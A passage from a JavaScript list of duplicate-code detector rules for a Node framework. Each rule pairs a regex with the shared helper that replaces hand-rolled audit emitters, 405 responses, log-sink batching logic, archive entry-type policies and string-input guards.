    reason: "11 framework modules each hand-rolled the SAME stateless audit emitter — `function _emit(action, metadata, outcome) { try { audit().safeEmit({ action: action, outcome: outcome || \"success\", metadata: metadata[ || {}] }); } catch {} }` — a metadata-FIRST signature (outcome defaults to \"success\", the dominant case) incompatible with b.audit.namespaced's outcome-first, gated, prefixed shape, driven by hundreds of (action, metadata) call sites. The 7 mail modules (mail-dav + mail-server-imap/jmap/mx/pop3/managesieve/submission) used `metadata: metadata || {}`; the 4 non-mail (a2a-tasks / compliance / mcp-tool-registry / middleware/idempotency-key) used `metadata: metadata` — but every caller passes metadata, so the two are functionally identical. Extracted to auditEmit.emit (lib/audit-emit.js, self-lazy-requires audit to avoid a load cycle); each module does `var _emit = auditEmit.emit` leaving every call site unchanged (byte-equivalent — functionally proven). The (action, OUTCOME, metadata)-order variant (daemon/self-update _safeAuditEmit) — byte-identical body, differing only in param order — now routes too: each is a thin adapter `_safeAuditEmit(action, outcome, metadata) { auditEmit.emit(action, metadata, outcome); }` (the swapped order reproduces the same safeEmit; the audit lazyRequire + its only call dropped). The detector matches BOTH orders. allowlist is audit-emit.js (home); a re-introduced emit wrapper in either order trips this — use auditEmit.emit.",
  },
  {
    id: "audit-emit-to-sink-hand-rolled",
    primitive: "b.internal auditEmit.emitToSink(opts, action, outcome, metadata) (lib/audit-emit.js) — the OPERATOR-SINK drop-silent audit emit (the sink is threaded through `opts.audit` rather than the framework's global audit()), the no-op-when-absent variant the archive reader / tar-reader / writer share. Hand-rolling `function _emitAudit(opts, action, outcome, metadata) { if (!opts || !opts.audit || typeof opts.audit.safeEmit !== \"function\") return; try { opts.audit.safeEmit({ action: action, outcome: outcome, metadata: metadata }); } catch {} }` re-spells it; `var _emitAudit = auditEmit.emitToSink;` and call it unchanged.",
    // Anchors on the operator-sink forward `opts.audit.safeEmit({ action: action,
    // outcome: outcome, metadata: metadata }` — the bare action/outcome/metadata
    // payload. http-client's _emitAudit threads an extra `resource:` field (and
    // `metadata: metadata || {}`) between outcome and metadata, so it does NOT
    // match and correctly keeps its own wrapper. Home (audit-emit.js, where
    // emitToSink lives) is the sole allowlist entry.
    regex: /opts\.audit\.safeEmit\(\s*\{\s*action:\s*action\s*,\s*outcome:\s*outcome\s*,\s*metadata:\s*metadata\s*\}/,
    skipCommentLines: true,
    allowlist: ["lib/audit-emit.js"],
    reason: "archive-read, archive-tar-read, and archive (the ZIP/TAR readers + the writer) each hand-rolled a TOKEN-IDENTICAL operator-sink audit emitter — `function _emitAudit(opts, action, outcome, metadata) { if (!opts || !opts.audit || typeof opts.audit.safeEmit !== \"function\") return; try { opts.audit.safeEmit({ action: action, outcome: outcome, metadata: metadata }); } catch {} }` — differing only in whitespace. It is the OPERATOR-SINK sibling of auditEmit.emit: the sink comes from opts.audit (a reader/writer with no audit configured stays silent) rather than the framework's global audit(). A prior family-subset allowlist had mis-labelled these \"NOT byte-identical … heterogeneous _emitAudit family\" — a blind-allowlist trap a shared-run byte-identity cross-check caught. Extracted to auditEmit.emitToSink(opts, action, outcome, metadata); each module does `var _emitAudit = auditEmit.emitToSink` leaving every call site unchanged (functional parity proven: forwards when the sink exposes safeEmit, no-ops when opts/opts.audit/safeEmit is absent, drop-silent on a throwing sink). http-client._emitAudit is NOT a member — it threads an extra `resource: { kind, id }` field plus `metadata: metadata || {}` into the payload, a genuinely different audit shape, so it keeps its own wrapper and the detector does not match it. allowlist is audit-emit.js (home); a re-introduced operator-sink emit wrapper trips this — use auditEmit.emitToSink.",
  },
  {
    id: "method-not-allowed-405-hand-rolled",
    primitive: "b.internal denyResponse.methodNotAllowed(res, allow) (lib/middleware/deny-response.js) — the bare HTTP 405 refusal the single-file static-content middlewares share: an `Allow` header + a `text/plain` \"Method Not Allowed\" body with an explicit Content-Length. Hand-rolling `res.writeHead(405, { \"Allow\": \"GET, HEAD\", \"Content-Type\": \"text/plain; charset=utf-8\", \"Content-Length\": Buffer.byteLength(\"Method Not Allowed\") }); res.end(\"Method Not Allowed\");` re-spells it; call denyResponse.methodNotAllowed(res, \"GET, HEAD\").",
    // Anchors on a literal `writeHead(405` within ~200 chars of the
    // "Method Not Allowed" body string, in EITHER order (the `var bodyMsg =
    // "Method Not Allowed"` before writeHead, or the `res.end("Method Not
    // Allowed")` after). protected-resource-metadata's 405 is empty-bodied
    // (res.writeHead(H.METHOD_NOT_ALLOWED, …); res.end()) — no literal 405 and
    // no body string, so it does not match and keeps its own response; error-page
    // builds the reason from a STATUS_REASONS map with a dynamic status, also no
    // literal `writeHead(405`. Home (deny-response.js, where methodNotAllowed
    // lives) is the sole allowlist entry.
    regex: /(?:"Method Not Allowed"[\s\S]{0,200}?writeHead\(\s*405|writeHead\(\s*405[\s\S]{0,200}?"Method Not Allowed")/,
    skipCommentLines: true,
    allowlist: ["lib/middleware/deny-response.js"],
    reason: "The single-file static-content middlewares — middleware/assetlinks (Digital Asset Links), middleware/security-txt (RFC 9116 /.well-known/security.txt), middleware/web-app-manifest (W3C web app manifest) — each hand-rolled the same bare HTTP 405: a GET/HEAD method guard writing `Allow: GET, HEAD` + a `text/plain; charset=utf-8` \"Method Not Allowed\" body with an explicit Content-Length (assetlinks/web-app-manifest via Buffer.byteLength(bodyMsg); security-txt inlined the literal 18 — byteLength(\"Method Not Allowed\") === 18, byte-identical). Extracted to denyResponse.methodNotAllowed(res, allow) (lib/middleware/deny-response.js, the refusal-response home alongside denyResponse); each caller's guard becomes `if (req.method !== \"GET\" && req.method !== \"HEAD\") { denyResponse.methodNotAllowed(res, \"GET, HEAD\"); return; }` (byte-parity proven: status 405 + identical head incl Content-Length + \"Method Not Allowed\" body). NOT routed through the heavier denyResponse(req,res,ctx) — that omits the explicit Content-Length (relies on Node's auto-set) and carries the onDeny-hook / problem+json / apiEncrypt paths, a different response shape. protected-resource-metadata's 405 (empty body + Cache-Control: no-store) and the pass-to-next method guards (health / static return next()) are genuinely different and not members. allowlist is deny-response.js (home); a re-introduced hand-rolled 405 \"Method Not Allowed\" trips this — use denyResponse.methodNotAllowed.",
  },
  {
    // Gated reason-hoisting audit emitter — routes to b.audit.namespaced(null, …).
    // backup / restore / scheduler / config-drift / legal-hold each hand-rolled a
    // gated drop-silent emitter `function _emit(action, info, outcome) { if
    // (!auditOn) return; [try] <sink>.safeEmit({ action, outcome, metadata: info
    // || {}, reason: info && info.reason ? info.reason : null[, resource…] }) [catch] }`
    // — the verbatim-gated namespaced form PLUS a top-level `reason` hoisted from
    // metadata.reason (and legal-hold a `resource` field). b.audit.namespaced already
    // carries the gate (opts.audit), the operator sink (opts.sink — config-drift /
    // legal-hold's auditInstance), and arbitrary top-level event fields (its 4th
    // `extra` param — reason + resource), so each routes to `audit().namespaced(null,
    // { audit: auditOn[, sink: auditInstance] })` with a thin `(action, info,
    // outcome)` wrapper passing `{ reason: …[, resource: …] }` as extra. The 10th-
    // extraction detector (audit-verbatim-emit-hand-rolled) missed these — they have
    // no try/catch (backup/restore/scheduler) and/or the extra reason field. external-
    // db (reason is a plain param `reason: reason`), audit-tools (`row.reason`),
    // subject (`requestReason`), and gdpr-ropa (reason set in the metadata arg at the
    // call site, not the emitter) are different and not matched.
    id: "audit-reason-hoist-emit-hand-rolled",
    primitive: "b.audit.namespaced(null, { audit, sink? }) with a top-level `reason` (and any extra event field) passed via its 4th `extra` arg — compose it instead of hand-rolling a gated `safeEmit({ action, outcome, metadata, reason: info && info.reason ? … })` emitter",
    regex: /safeEmit\(\s*\{(?:(?!\}\s*\))[\s\S]){0,220}?reason:\s*\(?\s*\w+\s*&&\s*\w+\.reason/,
    allowlist: [],
    reason: "backup / restore / scheduler / config-drift / legal-hold each hand-rolled a gated drop-silent audit emitter that, beyond the standard verbatim-gated namespaced shape (`if (!auditOn) return; safeEmit({ action, outcome, metadata: info || {} })`), HOISTS a top-level `reason` field from `info.reason` (and legal-hold adds a `resource`). The 10th-extraction audit-verbatim-emit pass (b.audit.namespaced) skipped them because they have no try/catch (backup/restore/scheduler) and/or carry the extra reason/resource field — but b.audit.namespaced already expresses all of it: the gate (opts.audit), an operator-supplied sink (opts.sink — config-drift/legal-hold's `auditInstance || audit()`), and arbitrary extra top-level event fields (its 4th `extra` arg merges onto the event). Each routes to `var _ns = audit().namespaced(null, { audit: auditOn[, sink: auditInstance] })` with a thin `(action, info, outcome)` wrapper passing `{ reason: (info && info.reason) || null[, resource: { … } ] }` as extra (the wrapper preserves each module's internal `(action, info, outcome)` signature, so every call site is unchanged; outcome-equivalent — namespaced no-ops on a sink lacking safeEmit, the hand-rolled try/catch caught the same). The reason-hoist now lives at the namespaced boundary, not in a re-spelled safeEmit literal. ZERO allowlist — namespaced builds the event object then calls sink.safeEmit(evt), so it carries no inline `safeEmit({ … reason: x && x.reason … })` literal and never self-trips. external-db (`reason: reason`, a plain param), audit-tools (`row.reason`), subject (`requestReason`, a different field), and gdpr-ropa (reason set in the metadata argument at the call site, not in the emitter body) are genuinely different and are not matched.",
  },
  {
    // Operator-module dynamic require — extracted to moduleLoader.requireFresh.
    // b.migrations / b.seeders / b.externalDb.migrate each hand-rolled the SAME
    // load-operator-file core: bust the require cache for the path, then
    // `try { <var> = require(path) }` and throw a typed error on failure — the
    // dynamic `require()` of operator-supplied code (the security-sensitive bit,
    // marked allow:dynamic-require). Consolidated to moduleLoader.requireFresh(
    // absPath, onLoadError) so the dynamic require lives behind ONE audited
    // marker; each caller keeps its own path construction + typed error +
    // export validation (mod.up / seed shape). db-schema's inline loop require
    // (no cache-bust, untyped Error) and cli.js's plugin-load (`return require`,
    // no typed catch) are different shapes and not matched; moduleLoader itself
    // uses `return require` (not `<var> = require`) so it never self-trips.
    id: "operator-module-require-hand-rolled",
    primitive: "b.internal moduleLoader.requireFresh(absPath, onLoadError) (lib/module-loader.js) — the single audited dynamic-require of an operator-supplied module file (migration / seed): cache-bust + require + throw onLoadError(e) on failure. Hand-rolling `delete require.cache[require.resolve(p)]; try { mod = require(p) } catch (e) { throw <typed> }` re-spells it; call requireFresh and keep your own path + typed error + export check.",
    regex: /delete\s+require\.cache\[require\.resolve\([\s\S]{0,320}?try\s*\{\s*\w+\s*=\s*require\(/,
    allowlist: [],
    reason: "b.migrations._loadMigration, b.externalDb.migrate._loadMigration, and b.seeders._loadSeed each hand-rolled a BYTE-IDENTICAL load-operator-file core — bust the require cache for the resolved path (`try { delete require.cache[require.resolve(fullPath)] } catch {}`), then `try { mod = require(fullPath) }` and throw a typed error on failure — i.e. the dynamic `require()` of operator-supplied code (the security-sensitive surface, carried under scattered `allow:dynamic-require` markers). migrate/migrations were a 3+-file STRONG-DUP (fp:334a03bc2aa7) with seeders the coincidental member whose 38-line _loadSeed shares the same core. Consolidated to moduleLoader.requireFresh(absPath, onLoadError) (lib/module-loader.js) so the dynamic require + cache-bust live behind ONE audited marker; each caller keeps its own path construction (migrate/migrations join opts.dir, seeders joins _envDir(rootDir, env)), its own typed error (_err vs new MigrationError(..., true) vs _err('LOAD_FAILED', …)), and its own export validation (mod.up / seed shape) — byte-equivalent (the absolute path resolves identically from the shared module). The require lives behind the `return require(absPath)` form in moduleLoader, so this `<var> = require` detector does not match the home (ZERO allowlist). db-schema's inline migration require (no cache-bust, inside the apply loop, untyped `new Error`) and cli.js's operator-plugin load (`return require(abs)` with no typed catch — a genuinely different operator-extensibility op) are different shapes and not matched.",
  },
  {
    // Operator-sink resource audit emitter — extracted to
    // requestHelpers.makeResourceAuditEmitter. The auth lockout /
    // bot-challenge and session device-binding primitives each hand-rolled
    // a BYTE-IDENTICAL operator-sink emitter: gated on the operator's
    // `auditInst` (no sink → no-op), build `{ action, outcome, resource: {
    // kind, id }, metadata }`, add the actor from the request when present,
    // and `auditInst.safeEmit(event)` drop-silent — varying only in the
    // resource kind ("auth.lockout" / "auth.bot_challenge" / "session.device")
    // and how the id derives from the per-call key. Consolidated to
    // requestHelpers.makeResourceAuditEmitter(sink, kind, idFor?)
    // (request-helpers owns extractActorContext, so the factory is
    // dependency-free). The gate=0 request emitters (dual-control /
    // network-allowlist) build a different event and are not matched.
    id: "resource-audit-emitter-hand-rolled",
    primitive: "requestHelpers.makeResourceAuditEmitter(sink, resourceKind, idFor?) — the gated operator-sink audit emitter that stamps resource: { kind, id } + the request actor; compose it instead of hand-rolling `if (!auditInst) return; try { var event = { …, resource: { kind, id }, … }; if (req) event.actor = extractActorContext(req); auditInst.safeEmit(event); } catch {}`",
    regex: /resource:\s*\{\s*kind:[\s\S]{0,200}?if\s*\(req\)\s*event\.actor\s*=[\s\S]{0,60}?extractActorContext\(req\)/,
    allowlist: ["lib/request-helpers.js"],
    reason: "b.auth.lockout, b.auth.botChallenge, and b.session.deviceBinding each hand-rolled a BYTE-IDENTICAL operator-sink audit emitter — gated on the operator-supplied `auditInst` (`if (!auditInst) return`, so no audit instance means no emit), building `{ action, outcome, resource: { kind, id }, metadata: metadata || {} }`, stamping `event.actor = requestHelpers.extractActorContext(req)` when a request is passed, and `auditInst.safeEmit(event)` inside a drop-silent try/catch. They vary ONLY in the resource kind ('auth.lockout' / 'auth.bot_challenge' / 'session.device') and how the resource id derives from the per-call key (lockout prefixes the namespace; the others use the key verbatim). The audit-verbatim-emit pass (10th, b.audit.namespaced) deliberately left these operator-sink-with-resource emitters per-caller, but they are a genuine 3-file dup once read together. Extracted to requestHelpers.makeResourceAuditEmitter(sink, resourceKind, idFor?) — request-helpers already owns extractActorContext, so the factory needs no audit dependency and emits to the operator sink directly (byte-equivalent: same direct auditInst.safeEmit, no framework-redaction change). idFor defaults to the key verbatim; lockout passes a closure prefixing its namespace. allowlist is request-helpers.js (the factory home). A re-introduced hand-rolled operator-sink resource emitter trips this — use makeResourceAuditEmitter. The gate=0 request audit emitters (dual-control / network-allowlist, which build a different event without the `auditInst` gate) are a different shape and are not matched.",
  },
  {
    // Archive entry-type security policy — extracted to archiveEntryPolicy.
    // The ZIP (archive-read) and TAR (archive-tar-read) readers each inlined a
    // byte-identical `DEFAULT_ENTRY_TYPE_POLICY = Object.freeze({ symlinks:false,
    // hardlinks:false, devices:false, fifos:false, sockets:false })` plus a
    // normalize-overlay. These deny the malicious-archive special-entry vectors
    // (symlink traversal out of the extraction root, device-node creation) by
    // default — a drift between the two readers (e.g. symlinks:true on one
    // format) would be a silent extraction-security hole. Consolidated to
    // archiveEntryPolicy (lib/archive-entry-policy.js); both readers alias the
    // shared const + normalize. A re-inlined policy literal trips this.
    id: "inline-archive-entry-type-policy",
    primitive: "archiveEntryPolicy.DEFAULT_ENTRY_TYPE_POLICY / archiveEntryPolicy.normalize(p) (lib/archive-entry-policy.js) — the shared archive-extraction entry-type security policy (deny symlinks / hardlinks / devices / fifos / sockets by default); import it instead of re-inlining the frozen default",
    regex: /DEFAULT_ENTRY_TYPE_POLICY\s*=\s*Object\.freeze\(\s*\{\s*symlinks/,
    allowlist: ["lib/archive-entry-policy.js"],
    reason: "lib/archive-read.js (ZIP) and lib/archive-tar-read.js (TAR) each inlined a BYTE-IDENTICAL entry-type extraction policy — `DEFAULT_ENTRY_TYPE_POLICY = Object.freeze({ symlinks:false, hardlinks:false, devices:false, fifos:false, sockets:false })` plus `_normalizeEntryTypePolicy(p) = p ? Object.freeze(Object.assign({}, DEFAULT_ENTRY_TYPE_POLICY, p)) : DEFAULT_ENTRY_TYPE_POLICY` — the security policy that denies the malicious-archive special-entry vectors (symlink traversal beyond the extraction root, hardlink/device/FIFO/socket creation) by default. A drift between the two readers (e.g. symlinks:true on one format only) would be an undetectable per-format extraction-security hole. Consolidated to lib/archive-entry-policy.js (DEFAULT_ENTRY_TYPE_POLICY + normalize); both readers alias the shared const and normalizer (byte-equivalent). This n=1 inverse detector refuses any re-inlined frozen entry-type-policy literal outside the home (allowlisted); the STRONG-DUP block detector only fires at 3 files, so the n=1 gate keeps the 2-reader extraction durable. The sibling _normalizeBombPolicy (over DEFAULT_BOMB_POLICY, an archive-bomb ratio policy) is a different const and is not matched.",
  },
  {
    // v0.15.13 — the metric sibling of the above: every primitive hand-rolled a
    // private `_emitMetric(verb, n, labels)` closure wrapping a prefixed
    // observability.safeEvent. The prefix is the only axis → b.observability.namespaced.
    id: "observability-namespaced-emit-hand-rolled",
    primitive: "b.observability.namespaced(prefix) (lib/observability.js) — the drop-silent metric emitter bound to one name prefix. Hand-rolling `observability().safeEvent(\"<ns>.\" + verb, n || 1, labels || {})` (private _emitMetric closure OR inline) re-spells the same wrapper; build it once with b.observability.namespaced(\"<ns>\") and call the returned emitter.",
    regex: /safeEvent\(\s*"[a-zA-Z][a-zA-Z0-9_.]*\."\s*\+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Sibling of audit-namespaced-emit-hand-rolled: every primitive hand-rolled an `_emitMetric(verb, n, labels)` closure wrapping `observability().safeEvent(prefix + verb, n || 1, labels || {})` differing in the prefix (and one gated by auditOn); extracted b.observability.namespaced(prefix, gateFlag?) and routed ALL callers — the gated tus-upload passes its auditOn through the 2nd arg, so it is NOT an exception. Allowlist is EMPTY: the primitive uses a VARIABLE prefix so this literal-dotted-prefix detector never trips on lib/observability.js. The tight lowercase grep MISSED camelCase prefixes (auth.sdJwtVc.holder / middleware.tusUpload) — the detector is the discovery. New hand-rolled `safeEvent(\"<ns>.\" + …)` trips this — use b.observability.namespaced.",
  },
  {
    // v0.15.13 — the per-instance counter sibling of observability-namespaced:
    // primitives that take an `observability` instance wrapped safeEmit in a
    // private `_emitObs(name, labels)` that lazy-gets the module then calls
    // obs.safeEmit(obsInst, name, 1, labels) → b.observability.makeCounterEmitter.
    id: "observability-instance-counter-hand-rolled",
    primitive: "b.observability.makeCounterEmitter(sink) (lib/observability.js) — bind a per-instance counter emitter: returns (name, labels) that increments metric `name` by 1 (with labels) on the supplied observability `sink`, drop-silent on a sink throw and falling back to the global tap when sink is null. Hand-rolling `function _emitObs(name, labels) { var obs; try { obs = observability(); } catch (_e) { return; } obs.safeEmit(obsInst, name, 1, labels); }` re-spells it; build `var _emitObs = observability().makeCounterEmitter(obsInst)` once.",
    // Anchors on the lazy-get `obs = observability()` followed by `obs.safeEmit(` —
    // the per-instance lazy emitter wrapper. The primitive calls the LOCAL safeEmit
    // (no lazy `observability()` get, no `obs.` qualifier) so it never self-trips →
    // ZERO allowlist.
    regex: /obs\s*=\s*observability\(\)[\s\S]{0,80}?obs\.safeEmit\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "3 primitives that accept an `observability` instance (auth-bot-challenge / auth/lockout / session-device-binding) each wrapped safeEmit in a byte-identical private `function _emitObs(name, labels) { var obs; try { obs = observability(); } catch (_e) { return; } obs.safeEmit(obsInst, name, 1, labels); }` — a lazy-get of the observability module + a counter (value 1) emit to the module's obsInst, differing only in the obsInst closure var. The genuine logic (safeEmit — sink-or-global emit) was already extracted; the per-module binding is the remaining dup. Extracted b.observability.makeCounterEmitter(sink) (sibling of namespaced — namespaced binds a name PREFIX to the GLOBAL tap; makeCounterEmitter binds a counter to a per-instance SINK) and routed all 3 to `var _emitObs = observability().makeCounterEmitter(obsInst)`. The lazy-get + try/catch was dead defensive boilerplate (observability is always loaded by emit time); the primitive calls the local safeEmit directly. ZERO allowlist: the primitive has no `obs = observability()` lazy-get + `obs.safeEmit` qualifier. A re-introduced hand-rolled per-instance _emitObs trips this — use b.observability.makeCounterEmitter.",
  },
  {
    // v0.15.13 — the batching log-stream sinks (CloudWatch, OTLP/HTTP,
    // OTLP/gRPC, webhook) each hand-rolled the same backpressure enqueue:
    // drop-oldest overflow, push, flush-on-full-batch or coalesce-via-
    // scheduler, return { accepted, queued }. The axis of variation is the
    // per-sink overflow accounting + the entry built → b.safeAsync.makeBufferedEnqueue.
    id: "buffered-sink-enqueue-hand-rolled",
    primitive: "b.safeAsync.makeBufferedEnqueue(buffer, { batchSize, bufferLimit, flush, schedule, onOverflow? }) (lib/safe-async.js) — the bounded enqueue every batching egress sink makes per record: drop-oldest once the buffer is full, push, fire a non-awaited flush on a full batch else defer to a coalescing scheduler, resolve { accepted: true, queued }. Hand-rolling `buffer.push(x); if (buffer.length >= cfg.batchSize) { _flush().catch(function () {}); } else { flushScheduler.schedule(); } return Promise.resolve({ accepted: true, queued: buffer.length });` re-spells it; build `var _enqueue = safeAsync.makeBufferedEnqueue(buffer, { … })` once and call `_enqueue(entry)`.",
    // Anchors on the five co-occurring tokens of the hand-rolled tail in
    // order: `buffer.push(` → `if (buffer.length >= cfg.batchSize) {` →
    // `_flush().catch(` → `flushScheduler.schedule()` →
    // `return Promise.resolve({ accepted: true, queued: buffer.length`. The
    // {0,N} windows are pure ReDoS backstops sized well above the real body
    // (cloudwatch's inline entry-build is the longest) — the precision is the
    // five anchors. The primitive itself uses `>= batchSize` / `flush()` /
    // `schedule()` (no `cfg.` / `_` / `flushScheduler.`) so it never self-trips
    // → allowlist EMPTY. syslog (per-message framed write on a `queue`, no
    // batch-flush decision) and local (disk rotation) are NOT this shape.
    regex: /buffer\.push\([\s\S]{0,220}?if\s*\(\s*buffer\.length\s*>=\s*cfg\.batchSize\s*\)\s*\{[\s\S]{0,120}?_flush\(\)\.catch\([\s\S]{0,140}?flushScheduler\.schedule\(\)[\s\S]{0,180}?return Promise\.resolve\(\s*\{\s*accepted:\s*true,\s*queued:\s*buffer\.length/,
    skipCommentLines: true,
    allowlist: [],
    reason: "4 batching log-stream sinks (log-stream-cloudwatch / log-stream-otlp / log-stream-otlp-grpc / log-stream-webhook) each hand-rolled the SAME backpressure enqueue tail — drop-oldest overflow, push, `if (buffer.length >= cfg.batchSize) { _flush().catch(noop); } else { flushScheduler.schedule(); } return Promise.resolve({ accepted: true, queued: buffer.length });` — differing only in the overflow accounting (cloudwatch/otlp/webhook increment dropCount, otlp-grpc does not) and the entry pushed (raw record vs cloudwatch's { timestamp, message }). Bounding the buffer is mandatory: an unbounded queue behind a slow/dead collector is an OOM vector. Extracted to b.safeAsync.makeBufferedEnqueue(buffer, opts) (home of the makeScheduledFlush + makeDropCallback these sinks already compose); each sink keeps its divergent _flush/close/transport and its emit pre-step (cloudwatch's 256 KiB event drop) but routes the enqueue tail through `_enqueue(entry)`. otlp-grpc's _flush (HTTP/2 session, send-failed not retry-exhausted) and close genuinely diverge and stay per-sink — only its enqueue tail joins. Allowlist EMPTY: the primitive's body uses `>= batchSize` / `flush()` / `schedule()` (none of `cfg.batchSize` / `_flush` / `flushScheduler.`) so this detector never trips lib/safe-async.js. A re-introduced hand-rolled batch-enqueue tail trips this — use b.safeAsync.makeBufferedEnqueue.",
  },
  {
    // v0.15.13 — sibling of buffered-sink-enqueue-hand-rolled: the same three
    // HTTP batching sinks each hand-rolled the SAME graceful close — cancel the
    // scheduler, await the in-flight drain, final flush, THEN flip closed (order
    // load-bearing: the flush loop bails on !closed) → b.safeAsync.makeDrainingClose.
    id: "draining-close-hand-rolled",
    primitive: "b.safeAsync.makeDrainingClose({ scheduler, getInflight, flush, markClosed }) (lib/safe-async.js) — graceful shutdown for a batching egress sink: cancel the coalescing scheduler, await any in-flight drain, run a final flush, then mark closed (in that order — flipping closed first strands tail records the flush loop won't pull). Hand-rolling `async function close() { flushScheduler.cancel(); if (inFlightPromise) { try { await inFlightPromise; } catch {} } await _flush(); closed = true; }` re-spells it; build `var close = safeAsync.makeDrainingClose({ scheduler: flushScheduler, getInflight: function () { return inFlightPromise; }, flush: _flush, markClosed: function () { closed = true; } })`.",
    // Anchors on the four ordered tokens of the hand-rolled body:
    // `flushScheduler.cancel()` → `await inFlightPromise` → `await _flush()` →
    // `closed = true`. otlp-grpc's close is NOT matched — it flips `closed = true`
    // FIRST, awaits a lowercase `inflightPromise`, and tears down an HTTP/2
    // session instead of `await _flush()`. The primitive uses scheduler.cancel()
    // / getInflight() / flush() / markClosed() (none of these literals) → never
    // self-trips. Allowlist EMPTY.
    regex: /flushScheduler\.cancel\(\)[\s\S]{0,160}?await inFlightPromise[\s\S]{0,90}?await _flush\(\)[\s\S]{0,50}?closed = true/,
    skipCommentLines: true,
    allowlist: [],
    reason: "The 3 HTTP batching sinks (log-stream-cloudwatch / log-stream-otlp / log-stream-webhook) each hand-rolled the byte-identical graceful close — `flushScheduler.cancel(); if (inFlightPromise) { try { await inFlightPromise; } catch {} } await _flush(); closed = true;`. The ORDER is the whole point: the _flush while-loop guards on !closed, so flipping closed before the final drain strands the records an operator queued in the moment before shutdown (lost logs / lost audit on clean shutdown). Extracted to b.safeAsync.makeDrainingClose(opts) which encodes that drain-before-flip invariant once. otlp-grpc's close genuinely diverges (flips closed FIRST, lowercase inflightPromise, HTTP/2 teardown not _flush) and stays per-sink. Allowlist EMPTY: the primitive's body uses scheduler.cancel() / getInflight() / await flush() / markClosed() — none of the `flushScheduler.cancel()` / `await inFlightPromise` / `await _flush()` / `closed = true` literals — so it never trips lib/safe-async.js. A re-introduced hand-rolled drain-then-close trips this — use b.safeAsync.makeDrainingClose.",
  },
  {
    // v0.15.13 — the third batching-sink primitive: the single-flight drain loop
    // the 3 HTTP sinks each hand-rolled — inFlight latch, async IIFE that pulls
    // batches and ships each, finally-reschedule when records remain → b.safeAsync.makeBatchDrain.
    id: "batch-drain-loop-hand-rolled",
    primitive: "b.safeAsync.makeBatchDrain({ buffer, batchSize, scheduler, isClosed, sendBatch, onRetryExhausted, takeBatch?, beforeDrain?, onBeforeDrainFail? }) (lib/safe-async.js) — the single-flight drain loop behind a batching sink: one drain at a time (the inFlight latch), pull batches off the buffer and ship each via sendBatch until empty or closed, reschedule if records remain. Hand-rolling `async function _flush() { if (inFlight) return inFlightPromise; ...; inFlightPromise = (async function () { try { while (...) { ... } } finally { inFlight = false; inFlightPromise = null; if (buffer.length > 0) flushScheduler.schedule(); } })(); return inFlightPromise; }` re-spells it; build `var drain = safeAsync.makeBatchDrain({ … }); var _flush = drain.flush;` and read the latch via drain.getInflight() / drain.isInFlight().",
    // Anchors on the three ordered tokens unique to the hand-rolled drain:
    // `if (inFlight) return inFlightPromise` → `inFlightPromise = (async function ()`
    // → `flushScheduler.schedule()` (in the finally reschedule). The primitive owns
    // the same latch but reschedules via the injected `scheduler.schedule()` (no
    // `flushScheduler` literal) → never self-trips. otlp-grpc's drain uses a
    // combined `if (inFlight || buffer.length === 0) return` guard with no
    // inFlightPromise IIFE and is NOT matched. {0,N} are ReDoS backstops above the
    // ~600-char body. Allowlist EMPTY.
    regex: /if\s*\(\s*inFlight\s*\)\s*return inFlightPromise[\s\S]{0,80}?inFlightPromise = \(async function \(\)[\s\S]{0,700}?flushScheduler\.schedule\(\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "The 3 HTTP batching sinks (log-stream-cloudwatch / log-stream-otlp / log-stream-webhook) each hand-rolled the single-flight drain loop — `if (inFlight) return inFlightPromise; ...; inFlightPromise = (async function () { try { while (buffer.length > 0 && !closed) { <take batch>; try { await <send>; } catch (e) { dropCount += batch.length; _emitDrop('retry-exhausted', batch, e); break; } } } finally { inFlight = false; inFlightPromise = null; if (buffer.length > 0) flushScheduler.schedule(); } })(); return inFlightPromise;`. otlp + webhook were byte-identical; cloudwatch added a pre-loop autoCreate handshake and a byte-cap takeBatch. Extracted to b.safeAsync.makeBatchDrain(opts) — owns the inFlight latch + in-flight promise, takes the per-sink transport as sendBatch (throw ⇒ permanent reject → onRetryExhausted), and two optional strategy hooks (takeBatch for CloudWatch's byte cap, beforeDrain for the autoCreate handshake whose failure drains the whole buffer via onBeforeDrainFail). otlp-grpc's drain genuinely diverges (combined inFlight||empty guard, no inFlightPromise IIFE, HTTP/2 export not retry-with-dropCount) and stays per-sink. Allowlist EMPTY: the primitive reschedules through the injected scheduler.schedule() (no `flushScheduler` literal) so this detector never trips lib/safe-async.js. A re-introduced hand-rolled single-flight drain loop trips this — use b.safeAsync.makeBatchDrain.",
  },
  {
    // v0.15.13 — forensic-posture overlay: every content/identifier guard
    // hand-rolled its COMPLIANCE_POSTURES map as `Object.assign({}, PROFILES[tier],
    // { forensicSnippetBytes })` per regulation. The tier+snippet mapping IS the
    // framework's regulation-disposition policy → b.gateContract.compliancePostures.
    id: "string-guard-detector-bad-input-preamble-hand-rolled",
    primitive: "b.gateContract.detectStringInput(input, { name, noun?, emptyMode? }) (lib/gate-contract.js) — the typed bad-input + empty preamble every `raw`-contract string guard's detector opens with. Hand-rolling `if (typeof input !== \"string\") return [{ kind: \"bad-input\", severity: \"high\", ruleId: \"<name>.bad-input\", snippet: \"<noun> is not a string\" }]` (plus the `<name>.empty` check) re-spells it; call `var bad = gateContract.detectStringInput(input, { name: \"<name>\"[, noun, emptyMode] }); if (bad) return bad;` and keep the guard-specific byte cap + codepoint scan after it.",
    // Anchors on the dotted-literal `ruleId: \"<name>.bad-input\"` AND the
    // \"<noun> is not a string\" snippet within the same issue object — the
    // hand-rolled typed string bad-input. Scoped tight so it does NOT match the
    // object/Buffer guards (auth/image/pdf/archive/oauth/graphql: \"is not an
    // object/Buffer\"), the no-ruleId markdown/xml/yaml variant, or the primitive
    // (which builds `ruleId: cfg.name + \".bad-input\"` by concatenation).
    regex: /ruleId:\s*["'][a-z][a-z0-9]*\.bad-input["'][\s\S]{0,80}?["'][a-zA-Z ]+ is not a string["']/,
    skipCommentLines: true,
    allowlist: [],
